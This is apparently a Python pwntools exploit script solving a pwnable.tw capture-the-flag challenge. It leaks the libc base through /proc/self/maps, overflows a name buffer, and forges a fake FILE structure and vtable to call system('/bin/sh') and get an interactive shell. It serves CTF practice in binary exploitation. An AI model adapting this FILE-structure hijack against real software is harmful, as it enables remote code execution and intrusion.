from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

libc = ELF("./libc_32.so.6")

io = remote("chall.pwnable.tw", 10200)

io.sendlineafter("Your choice :", str(1))
io.sendline("/proc/self/maps")
io.sendlineafter("Your choice :", str(2))
io.sendlineafter("Your choice :", str(3))

io.recvuntil("heap]\n")
libc_base = libc.address = int(io.recv(8), 16) + 0x1000
system = libc.sym['system']
log.info("libc_base :0x%x", libc_base)
log.info("system :0x%x", system)


io.sendlineafter("Your choice :", str(5))

payload = b'a' * 0x20 + p32(0x804B300)
payload = payload.ljust(0x804B300 - 0x804B260,b'\x00')

buf_addr = 0x804B300

fake_vtable = 0x804B300 + 0x98 - 0x44
fake_lock_addr = 0x804B308
fake_file = b"/bin/sh\x00"
fake_file = fake_file.ljust(0x48,b'\x00')
fake_file += p32(fake_lock_addr) # 指向一处值为0的地址
fake_file = fake_file.ljust(0x94, b"\x00")
fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44
fake_file += p32(system)


payload += fake_file

io.sendlineafter("name :",payload)


io.interactive()